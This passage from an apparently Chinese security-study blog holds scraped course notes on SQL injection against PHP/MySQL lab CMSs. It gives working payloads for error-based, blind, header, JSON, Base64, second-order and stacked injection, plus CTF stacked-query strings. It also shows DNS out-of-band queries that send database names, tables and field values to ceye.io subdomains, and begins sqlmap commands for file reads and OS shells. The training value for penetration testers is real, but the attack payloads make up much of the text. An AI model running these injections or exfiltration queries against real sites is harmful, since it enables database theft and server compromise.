‘5.7.26‘（5.7.26 是数据库版本）\n\n\nextractvalue(目标XML, XPath路径)\n同 updatexml，XPath 路径非法触发报错\nand extractvalue(1, concat(0x5c, (select database())))\nXPATH syntax error: ‘\\testdb’（testdb 是当前数据库名）\n\n\nfloor(rand(0)*2)\n结合group by使用时，rand () 值重复导致主键冲突报错\nand (select count(*) from information_schema.tables group by floor(rand(0)*2) concat(0x7e, database(), 0x7e))\nDuplicate entry ‘testdb1’ for key ‘group_key’\n\n\n注入步骤（以 updatexml 为例）判断是否开启错误显示：访问http://xxx/news.php?id=1‘ → 若显示 SQL 语法错误→开启了错误显示。\n构造报错语句：id&#x3D;1’ and updatexml(1, concat(0x7e, (select version()), 0x7e), 1)–  → 从报错中获取版本。\n获取更多数据：替换select version()为select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 → 获取第一个表名。\n适用场景PHP 开启了display_errors&#x3D;On（显示 SQL 错误信息），适合快速获取数据（比布尔 &#x2F; 时间盲注效率高）。\n补充：如何关闭错误显示（防御）在 PHP 配置文件php.ini中设置：\ndisplay_errors = Offerror_log = /var/log/php_error.log # 错误日志写入文件，不对外显示\n\n4.4 三种盲注对比（表格优化）\n\n\n盲注类型\n核心依赖\n优点\n缺点\n适用场景\n\n\n\n布尔型\n页面回显变化（正常 &#x2F; 异常）\n逻辑清晰，易判断\n需逐字符猜解，效率低\n页面有明确回显差异，无错误显示\n\n\n时间型\n页面响应延迟\n无需回显 &#x2F; 报错，适用广\n受网络影响大，效率最低\n页面无任何回显和错误提示\n\n\n报错型\nSQL 错误信息显示\n效率高，直接带数据\n需开启错误显示，局限性大\nPHP 开启 display_errors，需快速获取数据\n\n\n5. PHP-MySQL 注入条件与判断5.1 核心判断标准（补充原理）\n\n\n注入条件类型\n判断方法\n原理\n示例场景\n\n\n\n基于布尔\n构造and 1&#x3D;1（正常）和and 1&#x3D;2（异常）\n逻辑条件影响 SQL 查询结果，进而影响页面显示\n新闻详情页：正确 ID 显示内容，错误 ID 显示空白\n\n\n基于时间\n构造and sleep(3)，观察页面加载时间\n条件成立时触发延迟，影响响应时间\n登录页：无论用户名密码对错，页面显示一致\n\n\n基于报错\n构造非法 SQL（如id&#x3D;1’），观察是否显示错误\nPHP 未关闭错误显示，SQL 语法错误对外暴露\n测试环境页面：直接显示 “MySQL server version for the right syntax to use near ‘’1’’’ at line 1”\n\n\n5.2 黑盒测试优先选择（面试题解答优化）问题：黑盒测试时，若需盲注，优先选哪种方式？\n解答：\n优先尝试报错盲注：\n\n\n原因：构造简单（如加单引号），若开启错误显示，可快速获取数据，效率最高；\n\n\n\n操作：先输入id&#x3D;1’或id&#x3D;1 and 1&#x3D;@@version，观察是否有错误回显。\n\n\n\n其次尝试布尔盲注：\n\n\n若无错误显示，构造and 1&#x3D;1和and 1&#x3D;2，观察页面是否有差异（如内容显示 &#x2F; 隐藏、按钮状态变化）。\n\n\n\n最后尝试时间盲注：\n\n\n若页面无任何差异，用and sleep(3)测试延迟，缺点是效率低且受网络影响大。\n\n\n\n关键注意事项：需注意符号过滤（如单引号被转义，需用1’’或1’)尝试），以及空格过滤（用%20或&#x2F;**&#x2F;替换空格）。\n6. 实战 CMS 案例解析（步骤优化 + 补充说明）6.1 案例 1：xhcms - 插入报错注入（Insert 操作注入）目标通过 “留言提交” 功能（Insert 操作），利用报错盲注获取数据库版本。\n环境准备\n靶场：xhcms（PHP+MySQL）\n\n功能点：留言板（http://192.168.137.1:85/?r=contact）\n\n核心风险：留言内容未过滤，直接拼接进 Insert 语句。\n\n\n详细步骤（补充关键解释）定位注入点：\n\n\n查看源码：全局搜索insert，找到files&#x2F;submit.php的 Insert 语句：\n\n\n\nINSERT INTO interaction (name, content, ...) VALUES (&#x27;$name&#x27;, &#x27;$content&#x27;, ...)\n\n\n\n发现$content（留言内容）未过滤，且用单引号包裹→注入需闭合单引号。\n\n\n\n构造注入语句：\n\n\n留言内容输入：’ and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) and ‘\n\n\n\n关键：末尾的and ‘用于闭合 SQL 语句的最后一个单引号（原语句最后是’$content’，注入后变为’内容’ and … and ‘’，语法正确）。\n\n\n\n触发报错：\n\n\n注意：留言内容必须含中文（原理：xhcms 对纯英文内容有编码处理，导致报错不回显；中文可绕过编码，正常触发错误）。\n\n\n\n提交后，页面显示报错：XPATH syntax error: ‘5.7.26‘→获取到数据库版本。\n\n\n\n案例总结\nInsert 注入常出现在 “留言板、注册、评论” 等功能；\n\n需注意闭合 SQL 语句中的单引号 &#x2F; 双引号，避免语法错误；\n\n部分 CMS 对英文内容特殊处理，可尝试中文 &#x2F; 特殊字符触发报错。\n\n\n6.2 案例 2：kkcms - 删除延时注入（Delete 操作注入）目标通过 “用户组删除” 功能（Delete 操作），利用时间盲注猜解数据库名第一个字符。\n环境准备\n靶场：kkcms（PHP+MySQL）\n\n功能点：管理员后台用户组删除（http://192.168.137.1:86/admin/cms_usergroup.php）\n\n核心风险：删除参数del未过滤，直接拼接进 Delete 语句。\n\n\n详细步骤（补充工具使用说明）定位注入点：\n\n\n查看源码：全局搜索delete，找到admin&#x2F;model&#x2F;usergroup.php的 Delete 语句：\n\n\n\nDELETE FROM usergroup WHERE id=$del\n\n\n\n$del是 URL 参数（?del&#x3D;4），未过滤→可构造时间盲注语句。\n\n\n\n使用 Burp Suite 抓包测试：\n\n\n原因：浏览器无法直观显示延迟时间，Burp 的 “Repeater” 模块可查看响应时间。\n\n\n\n抓包：访问删除按钮，抓取 GET 请求http://xxx/admin/cms_usergroup.php?del=4。\n\n\n\n构造延时注入语句：\n\n\n原始参数：?del&#x3D;4\n\n\n\n注入语句：?del&#x3D;4%20or%20if(ord(left(database(),1))&#x3D;107,sleep(2),0)\n\n\n\n\n%20：替换空格（避免 URL 解析错误）；\n\n\n\n\n\n\nord(left(database(),1))&#x3D;107：判断数据库名第 1 个字符的 ASCII 码是否为 107（对应字符 ‘k’）；\n\n\n\n\n\n\n若条件成立，延迟 2 秒；不成立则无延迟。\n\n\n\n\n\n判断结果：\n\n\n在 Burp Repeater 中发送请求，观察 “Response Time”：\n\n\n\n\n若响应时间≈2 秒→条件成立（数据库名第 1 个字符是 ‘k’）；\n\n\n\n\n\n\n若响应时间≈0.1 秒→条件不成立，调整 ASCII 码值继续测试。\n\n\n\n\n\n关键知识点\nDelete 注入常出现在 “后台删除数据” 功能（需登录权限）；\n\n单引号被过滤时，用ord()转 ASCII 码比较（无需单引号包裹字符）；\n\n空格被过滤时，可用%20（URL 编码）、&#x2F;**&#x2F;（SQL 注释）替换。\n\n\n7. xhcms&#x2F;kkcms 搭建补充（新手友好版）7.1 xhcms 搭建步骤下载源码：从官方或安全靶场平台获取 xhcms 源码。\n配置数据库：\n\n\n新建 MySQL 数据库（如xhcms_db）；\n\n\n\n导入源码中的 SQL 文件（如xhcms.sql）；\n\n\n\n修改config.php中的数据库配置：\n\n\n\n$dbhost = &#x27;localhost&#x27;; // 数据库地址$dbuser = &#x27;root&#x27;;      // 用户名$dbpass = &#x27;123456&#x27;;    // 密码$dbname = &#x27;xhcms_db&#x27;;  // 数据库名\n\n部署到 PHP 环境：\n\n\n将源码放入 PHPStudy 的www目录（或 XAMPP 的htdocs目录）；\n\n\n\n访问http://localhost/xhcms/，若显示首页→搭建成功。\n\n\n\n7.2 kkcms 搭建步骤下载源码：获取 kkcms 管理员版源码（含后台功能）。\n配置数据库：\n\n\n新建数据库kkcms_db，导入kkcms.sql；\n\n\n\n修改inc&#x2F;config.php中的数据库信息。\n\n\n\n登录后台：\n\n\n访问http://localhost/kkcms/admin/，默认账号密码：admin/admin123；\n\n\n\n进入 “用户组管理”（cms_usergroup.php）→ 功能正常则搭建成功。\n\n\n\n8. 常见问题与优化建议8.1 注入时遇到的问题及解决方案\n\n\n问题现象\n原因\n解决方案\n\n\n\n单引号输入后变成&#39;\nPHP 开启了magic_quotes_gpc&#x3D;On（自动转义单引号）\n1. 用双引号尝试：” and 1&#x3D;1 – ；2. 用1’’闭合（转义后变成1&#39;&#39;，等效于1’’）\n\n\n空格输入后被过滤\nCMS 对空格进行了过滤\n用%20（URL 编码）、&#x2F;&#x2F;（SQL 注释）、+（部分场景）替换空格，如and&#x2F;&#x2F;1&#x3D;1\n\n\n报错盲注无回显\nPHP 关闭了display_errors\n改用布尔盲注或时间盲注；或尝试触发其他错误（如路径遍历）\n\n\n时间盲注延迟不稳定\n网络波动或服务器负载高\n增加延迟时间（如从 3 秒改为 5 秒），多次测试取平均值\n\n\n- \n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"043-WEB攻防-PHP应用&SQL注入&符号拼接&请求方法&HTTP头&JSON&编码类","url":"/2025/09/16/043-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&SQL%E6%B3%A8%E5%85%A5&%E7%AC%A6%E5%8F%B7%E6%8B%BC%E6%8E%A5&%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95&HTTP%E5%A4%B4&JSON&%E7%BC%96%E7%A0%81%E7%B1%BB/","content":"043-WEB攻防-PHP应用&amp;SQL注入&amp;符号拼接&amp;请求方法&amp;HTTP头&amp;JSON&amp;编码类引言一、SQL 注入基础：为什么会成功？在 PHP 开发中，若直接将用户输入（如 URL 参数、表单值）拼接到 SQL 语句中，且未做任何过滤，就可能引发注入。例如：\n// 危险写法：直接拼接用户输入$id$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM news WHERE id=&#x27;$id&#x27;&quot;; // 若$id是恶意值，SQL逻辑会被篡改\n\n核心矛盾：用户输入可控 + SQL 语句直接拼接，这是所有注入的前提。\n二、PHP-MYSQL 数据请求类型（注入的 “入门关卡”）不同请求类型的核心差异是原 SQL 语句中对用户输入的 “符号包裹方式” 不同（如是否有单引号、百分号），需针对性闭合符号才能注入成功。\n1. 数字型注入（无符号干扰，最简单）原 SQL 格式select * from news where id=$id; // $id直接作为数字，无引号包裹\n\n注入原理无需处理符号，直接用and&#x2F;or篡改逻辑，或用union联合查询。\n实战步骤测试是否为数字型：在 URL 后加?id&#x3D;1 and 1&#x3D;1（页面正常）、?id&#x3D;1 and 1&#x3D;2（页面异常），说明存在数字型注入；\n猜列数：?id&#x3D;1 order by 4（若正常，说明至少 4 列；若报错，减少列数直到正常）；\n联合查询：?id&#x3D;-1 union select 1,2,database(),4（-1让原查询无结果，只显示联合查询结果，database()可查当前数据库名）。\n2. 字符型注入（单引号干扰，最常见）原 SQL 格式select * from news where id=&#x27;$id&#x27;; // $id被单引号包裹，注入需先闭合单引号\n\n注入原理用户输入的$id会被单引号包裹，若直接输入1 union select…，SQL 会变成select * from news where id&#x3D;’1 union select…’（被当作字符串，无效）。\n需用’闭合左侧单引号，再用–+（注释符）忽略右侧多余内容。\n实战步骤测试是否为字符型：?id&#x3D;1’（页面报错，提示 “单引号未闭合”，说明是字符型）；\n闭合符号 + 注释：?id&#x3D;1’ –+（页面恢复正常，说明符号闭合成功）；\n联合查询：?id&#x3D;1’ union select 1,2,database(),4 –+（获取数据库名、版本等信息）。\n\n关键说明\n–+的作用：–是 SQL 注释符，+在 URL 中会被解析为空格，确保注释生效（也可用#，但 URL 中需转义为%23）。\n\n3. 搜索型注入（百分号干扰，多符号处理）原 SQL 格式select * from news where title like &#x27;%$keyword%&#x27;; // $keyword被%和&#x27;&#x27;双重包裹\n\n注入原理%是 SQL 的 “模糊匹配符”，需先闭合%和单引号，再注释右侧内容。\n实战步骤构造注入语句：?keyword&#x3D;1%’ union select 1,2,database(),4 –+ and ‘%’&#x3D;’；\n解析：1%’ 闭合左侧的%’（原 SQL 变成like ‘%1%’），–+注释右侧，and ‘%’&#x3D;’确保右侧的%被匹配（避免语法错误）。\n\n4. 框架型注入（括号 + 符号干扰，复杂场景）原 SQL 格式select * from news where (id=&#x27;$id&#x27;); // $id被()和&#x27;&#x27;双重包裹-- 或带limit：select * from news where id=&#x27;$id&#x27; limit 0,1;\n\n注入原理需先闭合括号和单引号，再注释后续内容。\n实战步骤闭合符号：?id&#x3D;1’) –+（1’) 闭合(‘$id，变成(id&#x3D;’1’)）；\n联合查询：?id&#x3D;1’) union select 1,2,database(),4 –+（若有 limit，可在末尾加limit 1,1调整结果显示）。\n\n总结：不同请求类型的核心差异\n\n\n请求类型\n原 SQL 符号包裹\n注入关键操作\n示例语句\n\n\n\n数字型\n无符号\n直接加 and&#x2F;union\n1 union select 1,2,3\n\n\n字符型\n单引号\n闭合单引号 + 注释\n1’ union select 1,2,3 –+\n\n\n搜索型\n单引号 + 百分号\n闭合 % 和单引号 + 注释\n1%’ union select 1,2,3 –+ and ‘%’&#x3D;’\n\n\n框架型\n单引号 + 括号\n闭合括号和单引号 + 注释\n1’) union select 1,2,3 –+\n\n\n三、PHP-MYSQL 数据请求方法（注入的 “攻击路径”）PHP 通过$_GET、$_POST、$_COOKIE等全局变量获取用户输入，甚至通过$_SERVER获取 HTTP 头信息。只要这些数据被拼接到 SQL 中，就可能引发注入。\n1. 核心请求方法：GET&#x2F;POST&#x2F;Cookie（直接输入注入）（1）GET 注入（最直观，参数在 URL 中）\n原理：通过 URL 参数（如?id&#x3D;1）传入恶意值，对应 PHP 代码$id &#x3D; $_GET[‘id’]；\n\n实战：参考 “数据请求类型” 中的示例（如字符型注入?id&#x3D;1’ union select… –+）。\n\n\n\n（2）POST 注入（参数在请求体中，需抓包）\n场景：登录表单（用户名 &#x2F; 密码）、提交表单等，对应 PHP 代码$username &#x3D; $_POST[‘username’]；\n\n实战步骤（以登录表单为例）：\n\n\n\n用 Burp 抓包：拦截登录请求（方法为 POST，参数在Form Data中，如username&#x3D;admin&amp;password&#x3D;123）；\n\n发送到 Repeater：修改username为恶意值，测试注入；\n\n猜列数：username&#x3D;admin’ order by 4 –+&amp;password&#x3D;任意值（通过Content-Length判断：正常时长度不变，报错时长度变化）；\n\n查数据库：username&#x3D;admin’ union select 1,database(),version(),4 –+&amp;password&#x3D;任意值（页面可能回显数据库名、版本）。\n\n\n\n\n（3）Cookie 注入（参数在 Cookie 中，需改 Cookie）\n原理：若 PHP 从 Cookie 获取值并拼接 SQL（如$c &#x3D; $_COOKIE[‘user’]），可修改 Cookie 注入；\n\n实战：用 Burp 抓包，在Cookie字段后加; user&#x3D;1’ union select 1,database(),3 –+，发送请求。\n\n\n\n关键说明：$_REQUEST的风险$_REQUEST会同时获取 GET、POST、Cookie 中的参数，若用$r &#x3D; $_REQUEST[‘r’]拼接 SQL，意味着GET&#x2F;POST&#x2F;Cookie 都可能成为注入入口，风险更高。\n2. HTTP 头注入（间接注入，易被忽略）部分网站会将 HTTP 头信息（如用户浏览器、IP）存入数据库（如统计用户设备、记录访问 IP），若直接拼接 SQL，会引发注入。常见可注入的 HTTP 头如下：\n\n\n\nHTTP 头\n作用\nPHP 获取方式\n注入场景\n\n\n\nUser-Agent\n告诉服务器客户端的浏览器 &#x2F; 系统版本\n$_SERVER[‘HTTP_USER_AGENT’]\n网站记录用户设备信息到数据库\n\n\nX-Forwarded-For（XFF）\n记录客户端真实 IP（代理场景）\n$_SERVER[‘HTTP_X_FORWARDED_FOR’]\n网站用 IP 做白名单验证（如仅允许特定 IP 登录）\n\n\nReferer\n记录请求来源页面\n$_SERVER[‘HTTP_REFERER’]\n网站验证请求是否来自指定页面（如防止跨站提交）\n\n\nHost\n记录客户端要访问的域名 &#x2F; IP\n$_SERVER[‘HTTP_HOST’]\n网站多域名部署时，用 Host 判断访问的站点\n\n\n实战案例：XFF 头注入（IP 白名单绕过）场景网站用 IP 白名单验证：仅数据库中存在的 IP 才能登录，PHP 代码如下：\n// 获取客户端IP（优先取XFF头）function getip() &#123;    if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) &#123;        $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); // 可被篡改    &#125; else &#123;        $ip = getenv(&quot;REMOTE_ADDR&quot;);    &#125;    return $ip;&#125;// 用IP查询数据库，判断是否允许登录$ip = getip();$sql = &quot;SELECT * FROM admin WHERE ip=&#x27;$ip&#x27;&quot;; // 直接拼接$ip，存在注入\n\n注入步骤抓包：拦截登录请求，查看是否有X-Forwarded-For头（若无则手动添加）；\n构造恶意 XFF 头：X-Forwarded-For: 127.0.0.1‘ union select 1,database(),user(),4 –+；\n发送请求：若页面回显database()的结果（如testdb），说明注入成功；\n绕过白名单：若仅需登录，可直接改 XFF 头为白名单 IP（如X-Forwarded-For: 192.168.1.100）。\n四、PHP-MYSQL 数据请求格式（编码 &#x2F; 格式的 “破解”）部分网站会对用户输入做 “格式封装”（如 JSON）或 “编码处理”（如 Base64），需先还原为原始数据，再构造注入语句。\n1. JSON 格式注入（需按 JSON 语法构造恶意值）场景前端用 JSON 格式提交数据，PHP 解码后拼接 SQL，代码如下：\n// 接收JSON数据（如前端POST的&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;&#125;）$jsonData = file_get_contents(&quot;php://input&quot;);$data = json_decode($jsonData, true); // 解码为数组// 直接拼接，存在注入$username = $data[&#x27;username&#x27;];$password = $data[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;&quot;;\n\n注入步骤\n抓包：拦截 POST 请求，查看请求体是否为 JSON 格式（如{“username”:”admin”,”password”:”123”}）；\n\n构造恶意 JSON：按字符型注入规则，修改username为admin’ union select 1,database(),version(),4 #，注意 JSON 语法需正确（引号用双引号，内部单引号无需转义）；\n\n发送请求：请求体改为{“username”:”admin’ union select 1,database(),version(),4 #”,”password”:”任意值”}，若回显数据库信息，注入成功。\n\n\n2. Base64 编码注入（需先编码恶意语句）场景前端将参数 Base64 编码后提交，PHP 解码后拼接 SQL，代码如下：\n// 获取GET参数id（Base64编码）$id = $_GET[&#x27;id&#x27;] ?? &#x27;MQ==&#x27;; // 默认为MQ==（Base64解码后是1）$bid = base64_decode($id); // 解码为原始值// 直接拼接，存在注入$sql = &quot;SELECT * FROM news WHERE id=&#x27;$bid&#x27;&quot;;\n\n注入步骤确定编码方式：若?id&#x3D;MQ&#x3D;&#x3D;对应页面显示id&#x3D;1的内容，说明MQ&#x3D;&#x3D;是1的 Base64 编码；\n构造恶意语句：按字符型注入规则，生成原始注入语句：1’ union select 1,database(),3,4 –+；\nBase64 编码：将原始语句编码为MSd1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCAtLT4&#x3D;；\n发送请求：?id&#x3D;MSd1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCAtLT4&#x3D;，页面会回显数据库信息。\n关键工具Base64 编码 &#x2F; 解码：可用在线工具（如Base64.cn）或 Burp 的 “Decoder” 模块。\n五、常见问题与解决方案（注入失败怎么办？）\n\n\n常见问题\n原因\n解决方案\n\n\n\n注入语句报错：mysqli_num_rows() expects parameter 1 to be mysqli_result\nSQL 语法错误（如多了单引号、括号不匹配）\n检查注入语句的符号闭合：1. 确认原 SQL 的符号包裹方式（如是否有括号）；2. 简化语句（先测试1’ –+是否正常，再逐步加 union）\n\n\n联合查询无结果\n1. 原查询有结果（覆盖了联合查询结果）；2. 列数不匹配\n1. 用-1或999让原查询无结果（如?id&#x3D;-1’ union…）；2. 重新用order by确认列数\n\n\nHTTP 头注入无回显\n1. 网站未将 HTTP 头信息存入数据库；2. 注入语句未闭合符号\n1. 先测试 HTTP 头是否生效（如改 User-Agent 为test，看页面是否回显test）；2. 按字符型 &#x2F; 框架型规则闭合符号\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"045-WEB攻防-PHP应用&SQL二次注入&堆叠执行&DNS带外&功能点&黑白盒条件","url":"/2025/09/16/045-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5&%E5%A0%86%E5%8F%A0%E6%89%A7%E8%A1%8C&DNS%E5%B8%A6%E5%A4%96&%E5%8A%9F%E8%83%BD%E7%82%B9&%E9%BB%91%E7%99%BD%E7%9B%92%E6%9D%A1%E4%BB%B6/","content":"小迪SQL注入45~ 笔记总结PHP-MYSQL-二次注入-DEMO&amp;74CMS\n1、DEMO-用户注册登录修改密码\n\n1.注册新用户时，将注入的内容包含在注册的用户名后：admin’ and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#\n\n2.成功注入，并查看数据库，数据库中也存放了响应的注入语句\n\n3.正常登录：登陆后，随便输入旧密码和新密码，点击修改后，发现注入成功，错误回显版本号\n\n黑盒思路：分析功能有添加后对数据操作的地方（功能点）（很难测出，sql语句的符号影响，转义不能直接看出，容错处理代码中是否有，找到在哪里触发（执行置入的sql语句））\n白盒思路：insert 后进入 select 或 update 的功能的代码块（源代码去审）\n注入条件：插入时有转义函数或配置，后续有利用插入的数据（先插入后利用）\n需要注意的条件：实现二次注入，源码中有对应的转义（magic_quotes_gpc）或使用转义函数（addslashes）对方的代码有转义或者开启了魔术引号开关\n\n1.在注册用户逻辑中，首先使用addslashes 转义函数解析POST请求中的username，\n2.在后方插入新用户记录的时候，执行的SQL语句则会变为INSERT INTO users (username,password) VALUES (‘admin&#39; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#’,’123456’) 给username中的单引号添加转义字符\\\n3.在添加进数据库之后，数据库会自动删除转义字符&#x2F;，方便后面执行修改密码的时候，查询对应数据，执行二次注入\n4.如果不使用，转义函数，则会出现报错\n\n举个现实例子 🌰想象你正在往一个箱子里存纸条（数据库存数据），但箱子的管理员（PHP的addslashes()函数）有个规矩：如果纸条上有引号（&#39;或&quot;），必须用胶带（反斜杠\\）贴住，否则管理员会拒收。\n比如你写了一张纸条： 小明说：&quot;今天天气真好！&quot; 管理员会改成： 小明说：\\&quot;今天天气真好！\\&quot;（贴住双引号）\n\n你的攻击场景 🎯现在你想搞事情，往箱子里存一张纸条： admin&#39; and 攻击代码 # 但管理员发现单引号（&#39;），会直接贴胶带转义成： admin\\&#39; and 攻击代码 # 这样存入箱子后，攻击代码就被胶带封印了，无法触发。\n\n你的破解方法 💡于是你想了个办法： 在单引号前再加一个胶带（反斜杠） ，假装这是“合法胶带”。 输入： admin\\&#39; and 攻击代码 # 管理员看到单引号前已经有胶带（\\），就不再贴新胶带，最终存入箱子的数据是： admin\\&#39; and 攻击代码 #\n但关键来了！ **箱子（数据库）有个漏洞：它会把胶带（\\）吃掉！** 所以实际存进去的纸条是： admin&#39; and 攻击代码 #（单引号没被转义！）\n\n触发攻击的时刻 💥接下来，当有人从箱子里取出这条数据（比如用来做密码重置），直接拼接到新纸条（SQL语句）里： UPDATE users SET password=&#39;新密码&#39; WHERE username=&#39;admin&#39; and 攻击代码 #&#39;\n这时，单引号（&#39;）没有被胶带贴住，直接闭合了前面的username=&#39;admin&#39;，后面的攻击代码就被执行了！\n\n为什么加反斜杠（\\）？\n目的：骗过管理员（addslashes()），让它觉得单引号已经被贴胶带了，不再处理。\n结果：存入数据库后，胶带（\\）被吃掉，单引号暴露出来。\n触发时机：后续拼接SQL时，这个单引号直接闭合语句，执行攻击代码。\n\n\n2、CMS-74CMS 个人中心简历功能注册完填写教育经历这里的在学校名称和专业名称注入：aa’,’fullname’&#x3D;user()#\n专业名称这里有字符限制，选中打开检查修改maxlength&#x3D;”120”值\n\n\n\nPHP-MYSQL-堆叠注入-DEMO&amp;CTF 强网堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，例如php中的mysqli_multi_query函数。与之相对应的mysqli_query()只能执行一条SQL，所以要想目标存在堆叠注入,在目标主机存在类似于mysqli_multi_query()这样的函数,根据数据库类型决定是否支持多条语句执行.支持堆叠数据库：MYSQL MSSQL Postgresql等\n1.首先在数据库操作软件中Navicat Premium 16，使用：SELECT *FROM news WHERE id&#x3D;1;CREATE TABLE xxx(test VARCHAR(255));语句\n 这是一个选择数据的查询，从名为 ‘news’ 的表中选择所有列，其中 id 列的值为 1\n创建一个名为 ‘xxx’ 的表，该表包含一个名为 ‘test’ 的 VARCHAR(255) 类型的列\nSELECT *FROM news WHERE id&#x3D;1;CREATE TABLE xxx(test VARCHAR(255));\n由于sql语句在Navicat Premium 16有特定解析，支持两个封号的语句拼接在一起执行\n2.但是当该语句通过网址注入，由于php中多数执行sql语句的函数为mysqli_query()只能执行一条SQL：[http://192.168.137.1:84/sqli/new.php?**id=1;CREATE TABLE xxx(test VARCHAR(255)](http://192.168.137.1:84/sqli/new.php?id=1;CREATE TABLE xxx(test VARCHAR(255)));**\n\n3.但是当php采用mysqli_multi_query函数接收并执行sql语句的时候\n\n\n堆叠注入前提条件：\n1、目标存在 sql 注入漏洞\n2、目标未对”;”号进行过滤\n3、目标中间层查询数据库信息时可同时执行多条 sql 语句\n在目标系统的中间层中，存在一种机制或函数，允许一次性执行多条SQL语句。这种情况通常出现在使用诸如 mysqli_multi_query() 或者 PDO::multi_query() 这样的函数时\n支持堆叠数据库：MYSQL MSSQL Postgresql 等 \n-2019 强网杯-随便注（CTF 题型）\n‘;show databases;\n‘;show tables;\n‘;show columns from 1919810931114514;\n‘;select flag from 1919810931114514;\n‘;SeT \n@a&#x3D;0x73656c65637420666c61672066726f6d2060313931393831303933313131\n3435313460;prepare execsql from @a;execute execsql;\n1、目标存在 sql 注入漏洞\n2、目标未对”;”号进行过滤\n3、目标中间层查询数据库信息时可同时执行多条 sql 语句\nPHP-MYSQL-带外注入-DEMO&amp;DNSLOG产生原因：有部分注入点是没有回显的，所有读取也是没回显的，采用带外的形式，回显数据0.注入条件\n\nROOT 高权限且支持 load_file()\n\n**secure-file-priv&#x3D;**设置→默认关闭，必须添加到MYsql的配置文件my.ini中\n\nG:\\develop\\safety\\phpstudy_pro\\Extensions\\MySQL5.7.26my.ini\n\n有部分注入点是没有回显的，所有读取也是没回显的，采用带外\n\n\n\n\nsecure_file_priv 是 MySQL 数据库中的一个系统变量，用于限制使用 LOAD DATA INFILE 和 SELECT … INTO OUTFILE 语句时可以读取和写入的文件的路径。这个变量通常用于提高数据库的安全性，防止用户滥用这些语句导致的文件系统访问。\n如果设置了这个变量，MySQL 将仅允许在指定的路径下进行文件的读取和写入操作。\n如果没有设置，MySQL 将默认使用空值，表示禁用 LOAD DATA INFILE 和 SELECT … INTO OUTFILE。例如，\n如果 secure_file_priv 被设置为 f:\\，那么在执行 LOAD DATA INFILE 或 SELECT … INTO OUTFILE 时，只允许读写位于 f:\\ 目录下的文件。\n\nhttp://demo01/sqli/new.php?id=1%20union%20select%201,2,3,4,load_file(%27d:\\\\1.txt%27),6\n\n1.使用平台http://ceye.io（适用dnslog打不开的场景下）只需要记住每次登录，分配的identifier即可\nhttp://www.dnslog.cn\n\n2.带外应用场景：解决不回显，反向连接，SQL注入，命令执行，SSRF等\n\nSQL注入\nselect load_file(concat(‘\\\\‘,(select database()),’.wk0crf.ceye.io\\aa’));and (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.wk0crf.ceye.io&#x2F;abc’)))\n\n查询当前数据库\n\n\n\n\n查询其他数据库\nid&#x3D;1 and load_file(concat(“\\\\“,(select schema_name from information_schema.schemata limit 0,1),”.wk0crf.ceye.io\\xxx.txt”))“””由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数limit 0,1 查询第一个数据库名limit 1,1 查询第二个数据库名limit 2,1 查询第三个数据库名“””\n\n\n查询当前数据库dome01中第一个表名\nid&#x3D;1 and load_file(concat(“\\\\“,(select table_name from information_schema.tables where table_schema&#x3D;’dome01’ limit 0,1 ),”.wk0crf.ceye.io&#x2F;abc”))“””\n由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数limit 0,1 查询第一个表名limit 1,1 查询第二个表名\n\n\nlimit 2,1 查询第三个表名\n  “””\n\n查询security数据库emails表下第一个列名\n\nid=1 and load_file(concat(&quot;\\\\\\\\&quot;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),&quot;.dbuh8a.ceye.io\\\\xxx.txt&quot;))\n\n\n查询字段值 数据库名为security 表名emails 列名id\n\nid=1 and load_file(concat(&quot;\\\\\\\\&quot;,(select id from security.emails limit 0,1),&quot;.dbuh8a.ceye.io\\\\xxx.txt&quot;))\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"046-WEB攻防-注入工具&SQLMAP&Tamper编写&指纹修改&高权限操作&目录架构","url":"/2025/09/16/046-WEB%E6%94%BB%E9%98%B2-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7&SQLMAP&Tamper%E7%BC%96%E5%86%99&%E6%8C%87%E7%BA%B9%E4%BF%AE%E6%94%B9&%E9%AB%98%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C&%E7%9B%AE%E5%BD%95%E6%9E%B6%E6%9E%84/","content":"小迪SQL注入46~ 笔记总结一、权限操作-文件&amp;命令&amp;交互式测试：MYSQL高权限注入引出权限：–is-dba（误报） –privileges（只能通过很多false或者true判断，不明显）\n推荐使用–current-user\n引出文件：–file-read –file-write –file-dest引出命令：–os-cmd&#x3D; –os-shell –sql-shell\n1.python sqlmap.py -u “http://demo01/sqli/new.php?id=1“ –is-dba –is-dba（是否是数据库管理员）（会误报）或者&#x3D;&#x3D;–current-user（获取当前用户名称，推荐）&#x3D;&#x3D;\ncurrent user: ‘root@localhost’,代表是最高权限Root权限\n\n\n\n2.判断是否可注入：python sqlmap.py -u “http://demo01/sqli/new.php?id=1&quot;使用 SQLMap 